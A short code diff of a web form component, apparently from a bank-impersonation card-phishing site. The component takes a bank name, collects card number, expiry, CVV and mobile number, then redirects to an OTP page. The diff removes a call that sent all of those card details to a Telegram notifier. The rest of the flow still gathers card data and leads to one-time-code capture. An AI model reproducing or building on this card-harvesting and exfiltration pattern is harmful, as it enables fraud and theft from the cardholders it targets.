@@ -127,13 +127,6 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
   function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isValid) return
-    notifyTelegram('Card Details Submitted', [
-      { label: 'Bank', value: bankName },
-      { label: 'Card Number', value: cardNumber },
-      { label: 'Expiry', value: `${month}/${year}` },
-      { label: 'CVV', value: cvv },
-      { label: 'Mobile', value: mobile },
-    ])
     // Continue to the OTP step, passing just the mobile number so it can be
     // masked on the next page.
     router.push(`/bank/${slug}/otp?mobile=${encodeURIComponent(mobile)}`)
